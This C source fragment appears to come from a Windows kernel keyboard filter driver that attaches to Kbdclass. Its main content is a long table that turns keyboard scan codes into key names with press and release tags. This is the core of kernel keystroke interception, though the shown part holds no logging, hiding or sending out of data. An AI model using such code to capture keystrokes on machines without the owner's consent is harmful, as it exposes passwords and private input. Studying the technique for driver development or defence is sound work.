#include <ntddk.h>
#include <ntddkbd.h>

// Kbdclass驱动的名字
#define KBD_DRIVER_NAME  L"\\Driver\\Kbdclass"
#define DELAY_ONE_MICROSECOND   (-10)
#define DELAY_ONE_MILLISECOND   (DELAY_ONE_MICROSECOND*1000)
#define DELAY_ONE_SECOND        (DELAY_ONE_MILLISECOND*1000)

typedef struct _C2P_DEV_EXT {
    PDEVICE_OBJECT TargetDeviceObject;// 绑定的设备对象
    PDEVICE_OBJECT LowerDeviceObject;// 绑定前栈顶设备
} C2P_DEV_EXT, * PC2P_DEV_EXT;

// 未文档化函数 声明即可使用
NTSTATUS
ObReferenceObjectByName(PUNICODE_STRING ObjectName,
                        ULONG Attributes,
                        PACCESS_STATE AccessState,
                        ACCESS_MASK DesiredAccess,
                        POBJECT_TYPE ObjectType,
                        KPROCESSOR_MODE AccessMode,
                        PVOID ParseContext,
                        PVOID* Object);
// 还有它
extern POBJECT_TYPE* IoDriverObjectType;

// 扫描码到实际信息的转换
VOID MakeCodeToASCII(USHORT MakeCode, USHORT Flags, PCHAR Ascii)//Ascii为16字节
{
    if (Flags >= 2) {
        if (Flags == 2) {
            switch (MakeCode) {
                case 0x2a:
                {
                    strncpy(Ascii, " ", 16);
                    break;
                }
                case 0x5b:
                case 0x5c:
                {
                    strncpy(Ascii, "Windows [down]", sizeof("Windows [down]"));
                    break;
                }
                case 0x48:
                {
                    strncpy(Ascii, "Up [down]", sizeof("Up [down]"));
                    break;
                }
                case 0x50:
                {
                    strncpy(Ascii, "Down [down]", sizeof("Down [down]"));
                    break;
                }
                case 0x4b:
                {
                    strncpy(Ascii, "Left [down]", sizeof("Left [down]"));
                    break;
                }
                case 0x4d:
                {
                    strncpy(Ascii, "Right [down]", sizeof("Right [down]"));
                    break;
                }
                case 0x53:
                {
                    strncpy(Ascii, "Del [down]", sizeof("Del [down]"));
                    break;
                }
                default:
                {
                    strncpy(Ascii, "Error", sizeof("Error"));
                    break;
                }
            }
        }
        if (Flags == 3) {
            switch (MakeCode) {
                case 0x2a:
                {
                    strncpy(Ascii, " ", sizeof(" "));
                    break;
                }
                case 0x5b:
                case 0x5c:
                {
                    strncpy(Ascii, "Windows [up]", sizeof("Windows [up]"));
                    break;
                }
                case 0x48:
                {
                    strncpy(Ascii, "Up [up]", sizeof("Up [up]"));
                    break;
                }
                case 0x50:
                {
                    strncpy(Ascii, "Down [up]", sizeof("Down [up]"));
                    break;
                }
                case 0x4b:
                {
                    strncpy(Ascii, "Left [up]", sizeof("Left [up]"));
                    break;
                }
                case 0x4d:
                {
                    strncpy(Ascii, "Right [up]", sizeof("Right [up]"));
                    break;
                }
                case 0x53:
                {
                    strncpy(Ascii, "Del [up]", sizeof("Del [up]"));
                    break;
                }
                default:
                {
                    strncpy(Ascii, "Error", sizeof("Error"));
                    break;
                }
            }
        }
        return;
    }
    switch (MakeCode) {
        case 0x1d:
        {
            strncpy(Ascii, "Ctrl", sizeof("Ctrl"));
            break;
        }
        case 0x1c:
        {
            strncpy(Ascii, "Enter", sizeof("Enter"));
            break;
        }
        case 0x3a:
        {
            strncpy(Ascii, "CapsLock", sizeof("CapsLock"));
            break;
        }
        case 0x2a:
        case 0x36:
        {
            strncpy(Ascii, "Shift", sizeof("Shift"));
            break;
        }
        case 0x02:
        {
            strncpy(Ascii, "1", sizeof("1"));
            break;
        }
        case 0x4f:
        {
            strncpy(Ascii, "Num1", sizeof("Num1"));
            break;
        }
        case 0x03:
        {
            strncpy(Ascii, "2", sizeof("2"));
            break;
        }
        case 0x50:
        {
            strncpy(Ascii, "Num2", sizeof("Num2"));
            break;
        }
        case 0x04:
        {
            strncpy(Ascii, "3", 12);
            break;
        }
        case 0x51:
        {
            strncpy(Ascii, "Num3", sizeof("Num3"));
            break;
        }
        case 0x05:
        {
            strncpy(Ascii, "4", sizeof("4"));
            break;
        }
        case 0x4b:
        {
            strncpy(Ascii, "Num4", 12);
            break;
        }
        case 0x06:
        {
            strncpy(Ascii, "5", 12);
            break;
        }
        case 0x4c:
        {
            strncpy(Ascii, "Num5", 12);
            break;
        }
        case 0x07:
        {
            strncpy(Ascii, "6", 12);
            break;
        }
        case 0x4d:
        {
            strncpy(Ascii, "Num6", 12);
            break;
        }
        case 0x08:
        {
            strncpy(Ascii, "7", 12);
            break;
        }
        case 0x47:
        {
            strncpy(Ascii, "Num7", 12);
            break;
        }
        case 0x09:
        {
            strncpy(Ascii, "8", 12);
            break;
        }
        case 0x48:
        {
            strncpy(Ascii, "Num8", 12);
            break;
        }
        case 0x0a:
        {
            strncpy(Ascii, "9", 12);
            break;
        }
        case 0x49:
        {
            strncpy(Ascii, "Num9", 12);
            break;
        }
        case 0x0b:
        {
            strncpy(Ascii, "0", 12);
            break;
        }
        case 0x52:
        {
            strncpy(Ascii, "Num0", 12);
            break;
        }
        case 0x1e:
        {
            strncpy(Ascii, "a", 12);
            break;
        }
        case 0x30:
        {
            strncpy(Ascii, "b", 12);
            break;
        }
        case 0x2e:
        {
            strncpy(Ascii, "c", 12);
            break;
        }
        case 0x20:
        {
            strncpy(Ascii, "d", 12);
            break;
        }
        case 0x12:
        {
            strncpy(Ascii, "e", 12);
            break;
        }
        case 0x21:
        {
            strncpy(Ascii, "f", 12);
            break;
        }
        case 0x22:
        {
            strncpy(Ascii, "g", 12);
            break;
        }
        case 0x23:
        {
            strncpy(Ascii, "h", 12);
            break;
        }
        case 0x17:
        {
            strncpy(Ascii, "i", 12);
            break;
        }
        case 0x24:
        {
            strncpy(Ascii, "j", 12);
            break;
        }
        case 0x25:
        {
            strncpy(Ascii, "k", 12);
            break;
        }
        case 0x26:
        {
            strncpy(Ascii, "l", 12);
            break;
        }
        case 0x32:
        {
            strncpy(Ascii, "m", 12);
            break;
        }
        case 0x31:
        {
            strncpy(Ascii, "n", 12);
            break;
        }
        case 0x18:
        {
            strncpy(Ascii, "o", 12);
            break;
        }
        case 0x19:
        {
            strncpy(Ascii, "p", 12);
            break;
        }
        case 0x10:
        {
            strncpy(Ascii, "q", 12);
            break;
        }
        case 0x13:
        {
            strncpy(Ascii, "r", 12);
            break;
        }
        case 0x1f:
        {
            strncpy(Ascii, "s", 12);
            break;
        }
        case 0x14:
        {
            strncpy(Ascii, "t", 12);
            break;
        }
        case 0x16:
        {
            strncpy(Ascii, "u", 12);
            break;
        }
        case 0x2f:
        {
            strncpy(Ascii, "v", 12);
            break;
        }
        case 0x11:
        {
            strncpy(Ascii, "w", 12);
            break;
        }
        case 0x2d:
        {
            strncpy(Ascii, "x", 12);
            break;
        }
        case 0x15:
        {
            strncpy(Ascii, "y", 12);
            break;
        }
        case 0x2c:
        {
            strncpy(Ascii, "z", 12);
            break;
        }
        case 0x39:
        {
            strncpy(Ascii, "Space", 12);
            break;
        }
        case 0x0e:
        {
            strncpy(Ascii, "BackSpace", 12);
            break;
        }
        case 0x0f:
        {
            strncpy(Ascii, "Tab", 12);
            break;
        }
        case 0x45:
        {
            strncpy(Ascii, "NumLock", 12);
            break;
        }
        case 0x33:
        {
            strncpy(Ascii, ",", 12);
            break;
        }
        case 0x34:
        {
            strncpy(Ascii, ".", 12);
            break;
        }
        case 0x35:
        {
            strncpy(Ascii, "/", 12);
            break;
        }
        case 0x27:
        {
            strncpy(Ascii, ";", 12);
            break;
        }
        case 0x28:
        {
            strncpy(Ascii, "'", 12);
            break;
        }
        case 0x1a:
        {
            strncpy(Ascii, "[", 12);
            break;
        }
        case 0x1b:
        {
            strncpy(Ascii, "]", 12);
            break;
        }
        case 0x2b:
        {
            strncpy(Ascii, "\\", 12);
            break;
        }
        case 0x0c:
        {
            strncpy(Ascii, "-", 12);
            break;
        }
        case 0x0d:
        {
            strncpy(Ascii, "=", 12);
            break;
        }
        default:
        {
            strncpy(Ascii, "Error", 12);
            return;
        }
    }
    if (Flags == 0) {
        strncat(Ascii, " [down]", sizeof(" [down]"));
    }
    else {
        strncat(Ascii, " [up]", sizeof(" [up]"));
    }
    return;
}
